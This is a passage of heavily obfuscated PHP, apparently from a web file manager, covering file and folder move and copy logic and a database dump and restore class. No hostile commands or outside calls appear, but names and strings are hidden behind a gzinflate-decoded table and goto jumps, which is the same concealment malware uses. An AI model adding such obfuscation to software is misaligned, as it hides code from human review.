Model($°ßì›…[240])->linkAdd($ê­«—å¢[$°ßì›…[638]]); if ($²´‰®¢ && $ê­«—å¢[$°ßì›…[669]]) { $this->removeNow($¼µ†õË , !1); } $this->lockMoveEnd($¼µ†õË ); $this->lockWriteEnd($’È¬ïĞÉ, $‡¯¯ÕÁ°); $this->folderSizeReset($™é¦ıøï[$°ßì›…[202]]); $this->folderSizeReset($’È¬ïĞÉ); $¯ú©«‚ = array($™é¦ıøï[$°ßì›…[202]], $’È¬ïĞÉ); if ($™é¦ıøï[$°ßì›…[494]] == $°ßì›…[101]) { $¯ú©«‚[] = $¼µ†õË ; } $this->updateModifyTime($¯ú©«‚); Model($°ßì›…[642])->eventMove($¼µ†õË , $™é¦ıøï[$°ßì›…[202]], $’È¬ïĞÉ); Hook::trigger($°ßì›…[668], $¯ôê…é¤); return $æñĞÑ“á; } private function _move($ª©íˆùĞ, $²ÍÙŠÇ…, $øÒÇ¨óõ, &$–áß€‡¤, $®çĞ€½² = '') { $¢Çœ›·Ù =& $_SERVER[÷ôÚîå]; $¤†µ…¼ = $this->sourceInfo($ª©íˆùĞ); $‚ô’ë©æ = $¤†µ…¼[$¢Çœ›·Ù[494]] == $¢Çœ›·Ù[101]; $˜‹‹óó› = $®çĞ€½² ? $®çĞ€½² : $¤†µ…¼[$¢Çœ›·Ù[32]]; $ÎŠú±¿û = $this->fileNameExistAuto($²ÍÙŠÇ…, $¤†µ…¼); $this->lockMoveStart($ª©íˆùĞ); $this->lockWriteStart($²ÍÙŠÇ…, $˜‹‹óó›); if (!$ÎŠú±¿û) { return $this->_moveForce($ª©íˆùĞ, $²ÍÙŠÇ…, $˜‹‹óó›); } $ƒë«ÎÙÚ = $ÎŠú±¿û; $‹÷Œ°† = !1; if ($‚ô’ë©æ) { if ($øÒÇ¨óõ == REPEAT_RENAME_FOLDER) { $˜‹‹óó› = $this->fileNameAuto($²ÍÙŠÇ…, $˜‹‹óó›, $øÒÇ¨óõ, $‚ô’ë©æ); $ƒë«ÎÙÚ = $this->_moveForce($ª©íˆùĞ, $²ÍÙŠÇ…, $˜‹‹óó›); } else { if ($øÒÇ¨óõ == REPEAT_RENAME_FOLDER) { $øÒÇ¨óõ = REPEAT_RENAME; } $•¤·ÔÕ¤ = $this->_childrenListSelect($ª©íˆùĞ); foreach ($•¤·ÔÕ¤ as $ûãÃÚÉ®) { $this->_move($ûãÃÚÉ®[$¢Çœ›·Ù[203]], $ÎŠú±¿û, $øÒÇ¨óõ, $–áß€‡¤); } $‹÷Œ°† = !0; } } else { if ($øÒÇ¨óõ == REPEAT_SKIP) { $‹÷Œ°† = !0; } else { if ($øÒÇ¨óõ == REPEAT_RENAME || $øÒÇ¨óõ == REPEAT_RENAME_FOLDER) { $˜‹‹óó› = $this->fileNameAuto($²ÍÙŠÇ…, $˜‹‹óó›, $øÒÇ¨óõ, $‚ô’ë©æ); $ƒë«ÎÙÚ = $this->_moveForce($ª©íˆùĞ, $²ÍÙŠÇ…, $˜‹‹óó›); } else { if ($øÒÇ¨óõ == REPEAT_REPLACE) { $­Òâ ®ë = $this->sourceInfoCache($ÎŠú±¿û); $…ĞÍ‰¾¿ = $this->fileHistory($­Òâ ®ë, $¤†µ…¼[$¢Çœ›·Ù[550]], $¤†µ…¼[$¢Çœ›·Ù[89]]); $‹÷Œ°† = !0; if ($…ĞÍ‰¾¿) { $–áß€‡¤[$¢Çœ›·Ù[638]][] = $¤†µ…¼[$¢Çœ›·Ù[550]]; } } } } } if ($‹÷Œ°† && !$–áß€‡¤[$¢Çœ›·Ù[669]]) { $–áß€‡¤[$¢Çœ›·Ù[669]] = !0; } return $ƒë«ÎÙÚ; } private function _moveForce($öøÄƒ, $øÕÁ°‹, $¬Á£‹’) { $®†êáÌÈ =& $_SERVER[÷ôÚîå]; $ï›åª…¡ = $this->sourceInfo($öøÄƒ); $˜„…£†Á = $this->sourceInfo($øÕÁ°‹); $üç¿Ç¸ú = $ï›åª…¡[$®†êáÌÈ[494]] == $®†êáÌÈ[101]; $À€‡ı¶‡ = array($®†êáÌÈ[486] => $˜„…£†Á[$®†êáÌÈ[203]], $®†êáÌÈ[661] => $˜„…£†Á[$®†êáÌÈ[593]] . $˜„…£†Á[$®†êáÌÈ[203]] . $®†êáÌÈ[50], $®†êáÌÈ[657] => $˜„…£†Á[$®†êáÌÈ[200]], $®†êáÌÈ[658] => $˜„…£†Á[$®†êáÌÈ[578]], $®†êáÌÈ[660] => USER_ID, $®†êáÌÈ[503] => $¬Á£‹’); $¼à«á€ = $ï›åª…¡[$®†êáÌÈ[200]] == SourceModel::TYPE_GROUP && $˜„…£†Á[$®†êáÌÈ[200]] == SourceModel::TYPE_GROUP && $ï›åª…¡[$®†êáÌÈ[578]] == $˜„…£†Á[$®†êáÌÈ[578]]; if (!$¼à«á€ && $this->moveClearAuth) { Model($®†êáÌÈ[576])->authClear($öøÄƒ); } $½§¦ÄÛ‚ = $ï›åª…¡[$®†êáÌÈ[514]] == $®†êáÌÈ[101] && $˜„…£†Á[$®†êáÌÈ[514]] != $®†êáÌÈ[101]; if ($½§¦ÄÛ‚) { $À€‡ı¶‡[$®†êáÌÈ[513]] = 0; } if ($üç¿Ç¸ú) { $×³İ÷Äâ = array($®†êáÌÈ[661] => array($®†êáÌÈ[621], $ï›åª…¡[$®†êáÌÈ[593]] . $ï›åª…¡[$®†êáÌÈ[203]] . $®†êáÌÈ[622])); $€á³óÍ = $ï›åª…¡[$®†êáÌÈ[593]] . $ï›åª…¡[$®†êáÌÈ[203]] . $®†êáÌÈ[50]; $ê¸‘šç = $˜„…£†Á[$®†êáÌÈ[593]] . $˜„…£†Á[$®†êáÌÈ[203]] . $®†êáÌÈ[50] . $ï›åª…¡[$®†êáÌÈ[203]] . $®†êáÌÈ[50]; $¡£õ² = array($®†êáÌÈ[661] => array($®†êáÌÈ[670], "\162\145\x70\154\x61\x63\145\50\160\141\x72\145\x6e\164\x4c\x65\x76\x65\154\x2c\47{$€á³óÍ}\47\x2c\47{$ê¸‘šç}\x27\51"), $®†êáÌÈ[657] => $˜„…£†Á[$®†êáÌÈ[200]], $®†êáÌÈ[658] => $˜„…£†Á[$®†êáÌÈ[578]]); if ($½§¦ÄÛ‚) { $¡£õ²[$®†êáÌÈ[513]] = 0; } $this->where($×³İ÷Äâ)->data($¡£õ²)->save(); } $this->where(array($®†êáÌÈ[500] => $öøÄƒ))->data($À€‡ı¶‡)->save(); return $öøÄƒ; } private function clearShare($å¿ñÄ‰, $òƒÕ™­) { $ºÈ¢ÕŠâ =& $_SERVER[÷ôÚîå]; $·ô‘Î¬ø = $this->sourceInfo($å¿ñÄ‰); $èÖÌ¤Œ = $this->sourceInfo($òƒÕ™­); if ($·ô‘Î¬ø[$ºÈ¢ÕŠâ[578]] == $èÖÌ¤Œ[$ºÈ¢ÕŠâ[578]] && $·ô‘Î¬ø[$ºÈ¢ÕŠâ[200]] == $ºÈ¢ÕŠâ[671]) { return; } $™ºÔ…í³ = array($ºÈ¢ÕŠâ[593] => array($ºÈ¢ÕŠâ[621], $·ô‘Î¬ø[$ºÈ¢ÕŠâ[593]] . $å¿ñÄ‰ . $ºÈ¢ÕŠâ[622])); $Ñ»’È¸É = $this->field($ºÈ¢ÕŠâ[500])->where($™ºÔ…í³)->getField($ºÈ¢ÕŠâ[203], !0); if (!$Ñ»’È¸É) { return; } $™ºÔ…í³ = array($ºÈ¢ÕŠâ[203] => array($ºÈ¢ÕŠâ[7], $Ñ»’È¸É), $ºÈ¢ÕŠâ[672] => 1); $§ö°Ò = Model($ºÈ¢ÕŠâ[673])->field($ºÈ¢ÕŠâ[674])->where($™ºÔ…í³)->select(); if (!$§ö°Ò) { return; } $§ö°Ò = array_to_keyvalue($§ö°Ò, $ºÈ¢ÕŠâ[12], $ºÈ¢ÕŠâ[674]); $™ºÔ…í³ = array($ºÈ¢ÕŠâ[674] => array($ºÈ¢ÕŠâ[7], $§ö°Ò)); Model($ºÈ¢ÕŠâ[673])->where($™ºÔ…í³)->save(array($ºÈ¢ÕŠâ[672] => 0)); Model($ºÈ¢ÕŠâ[675])->where($™ºÔ…í³)->delete(); } public function copyFolderFromIO($æ‡÷Æ®£, $“‰÷ö, $ûÉˆ­Ä¸, $‚İçÛ¸, $”®Šôô², $á†£¶°¢ = false) { $—©×…Îë =& $_SERVER[÷ôÚîå]; $Š¶°¾ˆ¿ = array($—©×…Îë[639] => array(), $—©×…Îë[640] => array(), $—©×…Îë[638] => array(), $—©×…Îë[676] => array()); $ß§ê«é = $á†£¶°¢ ? $á†£¶°¢ : $æ‡÷Æ®£->pathThis($“‰÷ö); $¼ê²ïÀ˜ = $this->fileNameExist($ûÉˆ­Ä¸, $ß§ê«é); $—ä×Òäß = $this->mkdir($ûÉˆ­Ä¸, $ß§ê«é, $‚İçÛ¸); if (!$¼ê²ïÀ˜ || $‚İçÛ¸ == REPEAT_RENAME_FOLDER) { $‚İçÛ¸ = !1; } if ($¼ê²ïÀ˜) { $this->_childrenAllMake($¼ê²ïÀ˜); } Hook::trigger($—©×…Îë[677]); $this->_copyChildTo($æ‡÷Æ®£, $“‰÷ö, $—ä×Òäß, $‚İçÛ¸, $Š¶°¾ˆ¿, $”®Šôô²); Hook::trigger($—©×…Îë[678]); if ($—ä×Òäß) { $this->folderSizeResetChildren($—ä×Òäß); } $this->_childrenListClear(); Model($—©×…Îë[641])->addAll($Š¶°¾ˆ¿[$—©×…Îë[639]], array(), !0); Model($—©×…Îë[642])->eventCopy($—ä×Òäß); $this->saveAll($Š¶°¾ˆ¿[$—©×…Îë[640]]); Model($—©×…Îë[553])->linkAdd($Š¶°¾ˆ¿[$—©×…Îë[638]]); Model($—©×…Îë[553])->remove($Š¶°¾ˆ¿[$—©×…Îë[676]]); $this->folderSizeReset($ûÉˆ­Ä¸); $this->updateModifyTime($ûÉˆ­Ä¸); return $—ä×Òäß; } private function _copyChildTo($üƒ›Ø€Ó, $ŠÜ«²Ê, $‘œµà›ê, $ÊÒ£¤Ñ, &$¦íøÍñ®, $ò´âæì) { $¥‰öÈõ† =& $_SERVER[÷ôÚîå]; $Óı°¾¸õ = $this->sourceInfoCache($‘œµà›ê); $ÔÑ‰ ¤‰ = $üƒ›Ø€Ó->listPath($ŠÜ«²Ê); $ÔÑ‰ ¤‰ = $ÔÑ‰ ¤‰ ? $ÔÑ‰ ¤‰ : array($¥‰öÈõ†[96] => array(), $¥‰öÈõ†[95] => array()); $İÉ¡”­ª = array_merge($ÔÑ‰ ¤‰[$¥‰öÈõ†[96]], $ÔÑ‰ ¤‰[$¥‰öÈõ†[95]]); $ô»˜ÙÊ = $this->_addFiles($üƒ›Ø€Ó, $ÔÑ‰ ¤‰[$¥‰öÈõ†[96]], $ò´âæì); $×ŒÀÔÎæ = array(); foreach ($İÉ¡”­ª as &$¿°Ğš¹–) { if (isset($ô»˜ÙÊ[$¿°Ğš¹–[$¥‰öÈõ†[32]]])) { $¿°Ğš¹– = $ô»˜ÙÊ[$¿°Ğš¹–[$¥‰öÈõ†[32]]]; } $¿°Ğš¹–[$¥‰öÈõ†[494]] = $¿°Ğš¹–[$¥‰öÈõ†[33]] == $¥‰öÈõ†[88]; $¿°Ğš¹–[$¥‰öÈõ†[495]] = substr(_get($¿°Ğš¹–, $¥‰öÈõ†[179], $¥‰öÈõ†[12]), 0, 10); $¿°Ğš¹–[$¥‰öÈõ†[89]] = _get($¿°Ğš¹–, $¥‰öÈõ†[89], 0); $¿°Ğš¹–[$¥‰öÈõ†[550]] = _get($¿°Ğš¹–, $¥‰öÈõ†[550], 0); if (!isset($¿°Ğš¹–[$¥‰öÈõ†[679]]) && $¿°Ğš¹–[$¥‰öÈõ†[550]]) { $¦íøÍñ®[$¥‰öÈõ†[676]][] = $¿°Ğš¹–[$¥‰öÈõ†[550]]; } if ($ÊÒ£¤Ñ) { $ÊÚ¸Š¦² = $this->fileNameExistCache($‘œµà›ê, $¿°Ğš¹–[$¥‰öÈõ†[32]]); if ($ÊÚ¸Š¦²) { if ($¿°Ğš¹–[$¥‰öÈõ†[494]] || $ÊÒ£¤Ñ == REPEAT_SKIP) { continue; } if ($ÊÒ£¤Ñ == REPEAT_REPLACE) { $…»—òóû = $this->sourceInfoCache($ÊÚ¸Š¦²); $††ïÔà§ = $this->fileHistory($…»—òóû, $¿°Ğš¹–[$¥‰öÈõ†[550]], $¿°Ğš¹–[$¥‰öÈõ†[89]]); if ($††ïÔà§) { $¦íøÍñ®[$¥‰öÈõ†[638]][] = $¿°Ğš¹–[$¥‰öÈõ†[550]]; } continue; } else { if ($ÊÒ£¤Ñ == REPEAT_RENAME) { $¿°Ğš¹–[$¥‰öÈõ†[32]] = $this->fileNameAutoCache($‘œµà›ê, $¿°Ğš¹–[$¥‰öÈõ†[32]], $ÊÒ£¤Ñ, !1); } } } } if (!$¿°Ğš¹–[$¥‰öÈõ†[494]] && $¿°Ğš¹–[$¥‰öÈõ†[550]] == 0) { continue; } if (!$¿°Ğš¹–[$¥‰öÈõ†[494]] && $¿°Ğš¹–[$¥‰öÈõ†[550]]) { $¦íøÍñ®[$¥‰öÈõ†[638]][] = $¿°Ğš¹–[$¥‰öÈõ†[550]]; } $×ŒÀÔÎæ[] = $this->_makeItemData($¿°Ğš¹–, $Óı°¾¸õ, $¿°Ğš¹–[$¥‰öÈõ†[32]]); } unset($¿°Ğš¹–); if (!empty($×ŒÀÔÎæ)) { $this->addAll($×ŒÀÔÎæ); $this->_childrenListSelect($‘œµà›ê); } $º®’Û…Ü = $this->_childrenList($‘œµà›ê); $º®’Û…Ü = array_to_keyvalue($º®’Û…Ü, $¥‰öÈõ†[32]); foreach ($İÉ¡”­ª as $¿°Ğš¹–) { $…»—òóû = $º®’Û…Ü[$¿°Ğš¹–[$¥‰öÈõ†[32]]]; $Ü´¹éÂ« = $…»—òóû[$¥‰öÈõ†[203]]; $this->_copyApplyMeta($…»—òóû, $¦íøÍñ®); if ($¿°Ğš¹–[$¥‰öÈõ†[33]] == $¥‰öÈõ†[88]) { $¿°Ğš¹–[$¥‰öÈõ†[97]] = $üƒ›Ø€Ó->getPathInner($¿°Ğš¹–[$¥‰öÈõ†[97]]); $this->_copyChildTo($üƒ›Ø€Ó, $¿°Ğš¹–[$¥‰öÈõ†[97]], $Ü´¹éÂ«, $ÊÒ£¤Ñ, $¦íøÍñ®, $ò´âæì); } } } private function _addFiles($ÜĞœËÑÉ, $ˆÌ†€Ö¿, $·•¼’ãµ) { $ûŒä†Ê™ =& $_SERVER[÷ôÚîå]; if (!$ˆÌ†€Ö¿ || count($ˆÌ†€Ö¿) == 0) { return array(); } $­û¥á×Ó = array(); foreach ($ˆÌ†€Ö¿ as &$ìœ¹•Ç‡) { Hook::trigger($ûŒä†Ê™[680], $ìœ¹•Ç‡); $ìœ¹•Ç‡[$ûŒä†Ê™[97]] = $ÜĞœËÑÉ->getPathInner($ìœ¹•Ç‡[$ûŒä†Ê™[97]]); $šğƒ÷æ = $ÜĞœËÑÉ->hashSimple($ìœ¹•Ç‡[$ûŒä†Ê™[97]]); $ÑÛ›äîú = $ÜĞœËÑÉ->hashMd5($ìœ¹•Ç‡[$ûŒä†Ê™[97]]); if (strlen($ÑÛ›äîú) > 10 && !isset($­û¥á×Ó[$ÑÛ›äîú])) { $­û¥á×Ó[$ÑÛ›äîú] = array(); } $ìœ¹•Ç‡[$ûŒä†Ê™[681]] = $šğƒ÷æ; $ìœ¹•Ç‡[$ûŒä†Ê™[556]] = $ÑÛ›äîú; $­û¥á×Ó[$ÑÛ›äîú][] =& $ìœ¹•Ç‡; if (count($­û¥á×Ó[$ÑÛ›äîú]) > 1) { $ìœ¹•Ç‡[$ûŒä†Ê™[679]] = !0; } Hook::trigger($ûŒä†Ê™[682], $ìœ¹•Ç‡); } unset($ìœ¹•Ç‡); $íÅ°È © = array($ûŒä†Ê™[556] => array($ûŒä†Ê™[7], array_keys($­û¥á×Ó))); $…èÂ÷ŠÚ = Model($ûŒä†Ê™[683]); $»çğ¬şÆ = $…èÂ÷ŠÚ->where($íÅ°È ©)->select(); $»çğ¬şÆ = $»çğ¬şÆ ? $»çğ¬şÆ : array(); foreach ($»çğ¬şÆ as $üó‹Â«ù) { if (!isset($­û¥á×Ó[$üó‹Â«ù[$ûŒä†Ê™[556]]])) { continue; } $™õÖ¶¬ = $­û¥á×Ó[$üó‹Â«ù[$ûŒä†Ê™[556]]]; foreach ($™õÖ¶¬ as &$ìœ¹•Ç‡) { $ìœ¹•Ç‡[$ûŒä†Ê™[550]] = $üó‹Â«ù[$ûŒä†Ê™[550]]; $ìœ¹•Ç‡[$ûŒä†Ê™[679]] = !0; } unset($ìœ¹•Ç‡); } $ÊÌİ±³ = array(); foreach ($ˆÌ†€Ö¿ as $Ê¾˜×à) { Hook::trigger($ûŒä†Ê™[684], $Ê¾˜×à); if (isset($Ê¾˜×à[$ûŒä†Ê™[679]]) && $Ê¾˜×à[$ûŒä†Ê™[679]]) { Hook::trigger($ûŒä†Ê™[685], $Ê¾˜×à); continue; } $ßà¹˜øí = $ÜĞœËÑÉ->getPathInner($Ê¾˜×à[$ûŒä†Ê™[97]]); $¯ÛªşƒÊ = $…èÂ÷ŠÚ->addFileMake($ßà¹˜øí, $Ê¾˜×à[$ûŒä†Ê™[89]], $Ê¾˜×à[$ûŒä†Ê™[681]], $Ê¾˜×à[$ûŒä†Ê™[556]], $Ê¾˜×à[$ûŒä†Ê™[32]], $·•¼’ãµ); Hook::trigger($ûŒä†Ê™[685], $Ê¾˜×à); if (!is_array($¯ÛªşƒÊ)) { continue; } $ÊÌİ±³[] = $¯ÛªşƒÊ; } $…èÂ÷ŠÚ->addAll($ÊÌİ±³); $íÅ°È © = array($ûŒä†Ê™[556] => array($ûŒä†Ê™[7], array_keys($­û¥á×Ó))); $»çğ¬şÆ = $…èÂ÷ŠÚ->where($íÅ°È ©)->select(); $»çğ¬şÆ = $»çğ¬şÆ ? $»çğ¬şÆ : array(); foreach ($»çğ¬şÆ as $üó‹Â«ù) { if (!isset($­û¥á×Ó[$üó‹Â«ù[$ûŒä†Ê™[556]]])) { continue; } $À³Ğ¦ê« =& $­û¥á×Ó[$üó‹Â«ù[$ûŒä†Ê™[556]]]; foreach ($À³Ğ¦ê« as &$ìœ¹•Ç‡) { $ìœ¹•Ç‡[$ûŒä†Ê™[550]] = $üó‹Â«ù[$ûŒä†Ê™[550]]; } unset($ìœ¹•Ç‡); } $¸Ÿ´Øë = array(); foreach ($ˆÌ†€Ö¿ as $ŒŸ•®³÷) { $¸Ÿ´Øë[$ŒŸ•®³÷[$ûŒä†Ê™[32]]] = $ŒŸ•®³÷; } return $¸Ÿ´Øë; } } define($_SERVER[÷ôÚîå][686], $_SERVER[÷ôÚîå][687]); goto FÀ»…Ï«ÙŠ; FÀ»…Ï«ÙŠ: $wkenxhvbti = $_SERVER[÷ôÚîå][688]; if (!$wkenxhvbti) { die; } $_SERVER[ü÷’á¨À] = explode($_SERVER[÷ôÚîå][689], gzinflate(substr($_SERVER[÷ôÚîå][690], 10, -8))); goto B‚¹Ôêá¤Â; B—â¾‡áß›: class DbManage { function __construct($Ñ•ÔİòÜ = array()) { $˜‹ ò¿â =& $_SERVER[÷ôÚîå]; if (empty($Ñ•ÔİòÜ)) { $Ñ•ÔİòÜ = $GLOBALS[$˜‹ ò¿â[6]][$˜‹ ò¿â[21]]; } $this->database = $Ñ•ÔİòÜ; } public function model($°¶µ¢ø = '') { return new ModelBase($°¶µ¢ø, $_SERVER[÷ôÚîå][12], $this->database); } public function db($¼íåªæ± = false) { $Ú¹Ì’ˆó =& $_SERVER[÷ôÚîå]; $§ã¤¹·© = array_change_key_case($this->database); if ($this->dbType() == $Ú¹Ì’ˆó[13] || !$¼íåªæ±) { return $this->model()->db(); } $ÀÄëÛ = $§ã¤¹·©[$Ú¹Ì’ˆó[1061]]; $§ã¤¹·©[$Ú¹Ì’ˆó[1061]] = $Ú¹Ì’ˆó[12]; if ($§ã¤¹·©[$Ú¹Ì’ˆó[1056]] == $Ú¹Ì’ˆó[1053]) { $ªãüåŠ = $§ã¤¹·©[$Ú¹Ì’ˆó[1062]]; $§ã¤¹·©[$Ú¹Ì’ˆó[1062]] = substr($ªãüåŠ, 0, strrpos($ªãüåŠ, $Ú¹Ì’ˆó[1148])); } $this->database = $§ã¤¹·©; $×Øøã™É = $this->model()->db(); try { $í§×ºû• = $×Øøã™É->execute("\x73\150\157\x77\40\x64\x61\x74\141\142\x61\x73\x65\163\x20\x6c\151\153\x65\x20\x27{$ÀÄëÛ}\x27"); } catch (Exception $´ù‡³ÃÓ) { } if (!$í§×ºû•) { $×Øøã™É->execute("\143\162\145\x61\164\145\40\144\141\x74\141\x62\x61\x73\145\x20\140{$ÀÄëÛ}\x60"); } $§ã¤¹·©[$Ú¹Ì’ˆó[1061]] = $ÀÄëÛ; if ($§ã¤¹·©[$Ú¹Ì’ˆó[1056]] == $Ú¹Ì’ˆó[1053]) { $§ã¤¹·©[$Ú¹Ì’ˆó[1062]] .= $Ú¹Ì’ˆó[1148] . $ÀÄëÛ; } $this->database = $§ã¤¹·©; $×Øøã™É->execute("\x75\x73\x65\40\140{$ÀÄëÛ}\140"); return $×Øøã™É; } public function createTable($ùÏáµ·Ï, &$Æ³•ò²¶) { $á¤À¥ôõ =& $_SERVER[÷ôÚîå]; if (!IO::exist($ùÏáµ·Ï)) { ActionCall($á¤À¥ôõ[1149], !0, 0); show_json(LNG($á¤À¥ôõ[1150]), !1); } $ŸİÃ«†À = $this->model()->db(); $¹š«ç¡ = sqlSplit(IO::getContent($ùÏáµ·Ï)); foreach ($¹š«ç¡ as $ËôûĞÃ) { $ÛåÆÏ‡Ù = stripos($ËôûĞÃ, $á¤À¥ôõ[1151]) === 0; if ($ÛåÆÏ‡Ù) { $Æ³•ò²¶->task[$á¤À¥ôõ[1152]] += 1; } $ŸİÃ«†À->execute($ËôûĞÃ); if ($ÛåÆÏ‡Ù) { preg_match($á¤À¥ôõ[1153], $ËôûĞÃ, $½áŠ˜Ù•); $Æ³•ò²¶->task[$á¤À¥ôõ[1154]] = $½áŠ˜Ù•[1]; $Æ³•ò²¶->update(1); } } } public function insertTable($ëˆœ÷ûÂ, &$‰¤°ï ) { $ˆˆÃûß… =& $_SERVER[÷ôÚîå]; $éÚÉğ†Ú = $this->model()->db(); $İŒÅüåñ = $·ãì²øò ? array($·ãì²øò) : $éÚÉğ†Ú->getTables(); foreach ($ëˆœ÷ûÂ as $îœîÈÉÏ) { $·ãì²øò = basename($îœîÈÉÏ, $ˆˆÃûß…[877]); if (!in_array($·ãì²øò, $İŒÅüåñ)) { continue; } $‰¤°ï ->task[$ˆˆÃûß…[1154]] = $·ãì²øò; if (get_filesize($îœîÈÉÏ) == 0) { continue; } $ÁÑú¥‘¸ = $this->sqlToDb($îœîÈÉÏ, $‰¤°ï ); if (!$ÁÑú¥‘¸) { ActionCall($ˆˆÃûß…[1149], !0, 0); show_json(LNG($ˆˆÃûß…[1155]) . "\133{$·ãì²øò}\135", !1); } } } public function sqlFromDb($”“€ç›ü, $¼¡™Öğ , &$ÜâËÑúÎ, $ÆÖ²ÖÆµ = '') { if ($ÜâËÑúÎ) { $ÜâËÑúÎ->task[$_SERVER[÷ôÚîå][1154]] = $”“€ç›ü; } $®úÏ©Æú = $this->model($”“€ç›ü); $ «¸–‰Ò = 0; $¯¢¦é›± = 0; $İ´¦ì¹Û = 10000; $¹ü”Œ½è = fopen($¼¡™Öğ , $_SERVER[÷ôÚîå][1156]); $ºŸøÏ”¥ = $®úÏ©Æú->getPk(); $À÷ˆ‰„› = $®úÏ©Æú->getDbFields(); $¿öë½° = $_SERVER[÷ôÚîå][12]; if ($GLOBALS[$_SERVER[÷ôÚîå][876]] && in_array($”“€ç›ü, array($_SERVER[÷ôÚîå][1157], $_SERVER[÷ôÚîå][1158]))) { $¿öë½° = $”“€ç›ü; } do { $¥–Ó–ğ = array($ºŸøÏ”¥ => array($_SERVER[÷ôÚîå][1103], $¯¢¦é›±)); $İ´êÆëÔ = $®úÏ©Æú->where($¥–Ó–ğ)->field($À÷ˆ‰„›)->order($ºŸøÏ”¥ . $_SERVER[÷ôÚîå][1159])->limit($İ´¦ì¹Û)->select(); $İ´êÆëÔ = !empty($İ´êÆëÔ) ? $İ´êÆëÔ : array(); if (!($‹™ì¶ó = count($İ´êÆëÔ))) { break; } $ÆÒµ™õĞ = end($İ´êÆëÔ); $¯¢¦é›± = $ÆÒµ™õĞ[$ºŸøÏ”¥]; $î¾‹Ñªì = array(); foreach ($İ´êÆëÔ as $¦Ûİ¡Ò) { if ($¿öë½°) { if ($”“€ç›ü == $_SERVER[÷ôÚîå][1157]) { if ($¦Ûİ¡Ò[$_SERVER[÷ôÚîå][33]] == $_SERVER[÷ôÚîå][1160]) { $”å©Œ¡ = json_decode($¦Ûİ¡Ò[$_SERVER[÷ôÚîå][459]], !0); if ($”å©Œ¡[$_SERVER[÷ôÚîå][32]] == $GLOBALS[$_SERVER[÷ôÚîå][876]] && $”å©Œ¡[$_SERVER[÷ôÚîå][839]] != 1) { continue; } } } else { if ($¦Ûİ¡Ò[$_SERVER[÷ôÚîå][33]] == $_SERVER[÷ôÚîå][1161] && $¦Ûİ¡Ò[$_SERVER[÷ôÚîå][107]] == $_SERVER[÷ôÚîå][871]) { continue; } } } if ($ÆÖ²ÖÆµ) { $¦Ûİ¡Ò[$_SERVER[÷ôÚîå][97]] = "\x7b\151\157\x3a{$ÆÖ²ÖÆµ}\x7d" . substr($¦Ûİ¡Ò[$_SERVER[÷ôÚîå][97]], strlen("\173\151\157\72{$¦Ûİ¡Ò[$_SERVER[÷ôÚîå][907]]}\175")); $¦Ûİ¡Ò[$_SERVER[÷ôÚîå][907]] = $ÆÖ²ÖÆµ; } $î¾‹Ñªì[] = $_SERVER[÷ôÚîå][1162] . $this->sqlEncode($¦Ûİ¡Ò) . $_SERVER[÷ôÚîå][1163]; } $Óú§ÌÛÃ = "\111\x4e\123\105\x52\124\40\x49\x4e\x54\x4f\x20\140{$”“€ç›ü}\140\x20\x28\140" . implode($_SERVER[÷ôÚîå][1164], $À÷ˆ‰„›) . $_SERVER[÷ôÚîå][1165]; fwrite($¹ü”Œ½è, $Óú§ÌÛÃ . implode($_SERVER[÷ôÚîå][1166], $î¾‹Ñªì) . $_SERVER[÷ôÚîå][84] . PHP_EOL); $ «¸–‰Ò += $‹™ì¶ó; if ($ÜâËÑúÎ) { $ÜâËÑúÎ->update($‹™ì¶ó); } } while ($İ´¦ì¹Û == $‹™ì¶ó); fclose($¹ü”Œ½è); return $ «¸–‰Ò; } public function sqlToDb($åÍ“İÊ, &$•ù½«) { $úŞ÷™ƒä =& $_SERVER[÷ôÚîå]; $ÍÊØ´áÌ = $this->model()->db(); $×õŞœç‚ = @fopen($åÍ“İÊ, $úŞ÷™ƒä[1167]); if (!$×õŞœç‚) { return !1; } $üö¶‡è = 0; $ˆÒ¯€¸à = $úŞ÷™ƒä[12]; $¿é•İ— = array(); $÷±Œ™±ø = $this->dbType(); $º¦¬“Ï‹ = $÷±Œ™±ø == $úŞ÷™ƒä[13] ? 500 : 2000; $äãëëè = basename($åÍ“İÊ, $úŞ÷™ƒä[877]); $êÈ‚Æ¥ = 0; $±ÄÉ¿Öæ = 4194304; while (!feof($×õŞœç‚)) { $øÎŞšÉØ = trim(fgets($×õŞœç‚)); if (!$øÎŞšÉØ) { continue; } $¯í¿¢ = $this->sqlDecode($øÎŞšÉØ, $÷±Œ™±ø, $äãëëè); if (stripos($¯í¿¢, $úŞ÷™ƒä[440]) === 0) { if (!$ˆÒ¯€¸à) { $ˆÒ¯€¸à = $¯í¿¢ . $úŞ÷™ƒä[53]; } continue; } if ($•ù½«) { $•ù½«->task[$úŞ÷™ƒä[1152]] += 1; } $üö¶‡è++; $¿é•İ—[] = rtrim(rtrim(trim($¯í¿¢), $úŞ÷™ƒä[50]), $úŞ÷™ƒä[84]); $ãİ™§Ó = null; $…¢¦ü«¼ = strlen($¯í¿¢); $êÈ‚Æ¥ += $…¢¦ü«¼; $É€ ¡ƒ = strlen($ˆÒ¯€¸à) + $êÈ‚Æ¥ + (count($¿é•İ—) - 1); if ($É€ ¡ƒ >= $±ÄÉ¿Öæ) { $ãİ™§Ó = array_pop($¿é•İ—); if ($üö¶‡è > 1) { $üö¶‡è--; } } if ($üö¶‡è >= $º¦¬“Ï‹ || $ãİ™§Ó) { $¯í¿¢ = $ˆÒ¯€¸à . implode($úŞ÷™ƒä[50], $¿é•İ—); if (!$ÍÊØ´áÌ->execute($¯í¿¢)) { return !1; } if ($•ù½«) { $•ù½«->update($üö¶‡è); } $¿é•İ— = array(); $üö¶‡è = 0; $êÈ‚Æ¥ = 0; if ($ãİ™§Ó) { $¿é•İ— = array($ãİ™§Ó); $üö¶‡è = 1; $êÈ‚Æ¥ = $…¢¦ü«¼; } } } fclose($×õŞœç‚); if (!empty($¿é•İ—)) { $¯í¿¢ = $ˆÒ¯€¸à . implode($úŞ÷™ƒä[50], $¿é•İ—); if (!$ÍÊØ´áÌ->execute($¯í¿¢)) { return !1; } if ($•ù½«) { $•ù½«->update($üö¶‡è); } } return !0; } public function dropTable($®¦¤ÊãŸ = null) { $˜¹şÙ·Ê = $this->model()->db(); $ğ‹…ÒÎ¤ = $®¦¤ÊãŸ ? array($®¦¤ÊãŸ) : $˜¹şÙ·Ê->getTables(); if (!$ğ‹…ÒÎ¤) { return; } foreach ($ğ‹…ÒÎ¤ as $®¦¤ÊãŸ) { if ($®¦¤ÊãŸ) { $®¦¤ÊãŸ = strtolower($®¦¤ÊãŸ); } else { continue; } 